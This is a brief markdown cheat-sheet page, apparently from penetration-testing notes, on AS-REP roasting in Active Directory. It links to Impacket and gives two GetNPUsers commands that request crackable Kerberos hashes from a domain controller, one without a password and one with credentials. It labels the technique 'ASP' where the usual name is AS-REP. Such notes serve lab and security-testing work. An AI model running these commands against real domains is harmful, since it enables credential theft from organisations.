---
title: "ASP"
date: 2024-7-2
tags: ["asp-roasting", "asp-rep", "impacket", "active directory", "ad", "domain controller", "Windows"]
---

---
### Impacket

[Download Impacket](https://github.com/fortra/impacket)

### ASP-Roasting

```bash
impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10
```

### ASP-REP Vulnerable Users

```bash
impacket-GetNPUsers 'example.com/user:password' -dc-ip 10.10.11.10
```

<br>